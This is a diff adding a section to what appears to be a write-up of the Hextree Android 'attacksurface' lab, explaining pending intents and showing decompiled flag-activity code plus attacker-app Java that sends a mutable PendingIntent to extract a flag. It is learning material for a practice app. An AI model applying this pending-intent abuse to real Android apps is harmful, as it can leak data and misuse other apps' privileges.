@@ -314,6 +314,39 @@ setResult(42, intent);
 finish();
 ```
 Then we launch the app and fire the `LOGIN` intent with the button from our main activity, then the flag activity will call out second activity which will respond with the token and the value which in turn calls `success()` and gives us the flag.
+# Pending Intents
+
+These are intents that allow one app to create a start activity intent and give it to another app to perform the activity with the original app’s level of privilege.
+### 22 - Receive a pending intent
+
+flag22 jadx o/p
+```java
+PendingIntent pendingIntent = (PendingIntent) getIntent().getParcelableExtra("PENDING");
+        if (pendingIntent != null) {
+            try {  
+	            Intent intent = new Intent();
+                intent.getExtras();
+                intent.putExtra("success", true);
+                this.f.addTag(intent);
+                intent.putExtra("flag", this.f.appendLog(this.flag));
+                pendingIntent.send(this, 0, intent);
+                success(null, this);
+            }
+```
+
+The program is set up to see if the intent that was used to start the activity had the `PENDING` extra set. Once this happens, the program creates a new intent that includes the flag as an extra and sends it back to the calling application within a pending intent.
+```java
+		Intent intent = new Intent();  
+        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag22Activity"));  
+  
+        PendingIntent pendingIntent = PendingIntent.getActivity(this,0,intent,PendingIntent.FLAG_MUTABLE);  
+        intent.putExtra("PENDING",pendingIntent);  
+	...
+			public void onClick(View v) {  
+                startActivity(intent);  
+            }  
+```
+So we first make an intent to send to the flag activity. We then package our intent as a pending intent and send it with the extra `PENDING`. We need to make sure that the pending intent has the `MUTABLE` flag set - if we don’t then `Flag22Activity` won’t be able to modify the intent before sending it back.
 
 
 ## References
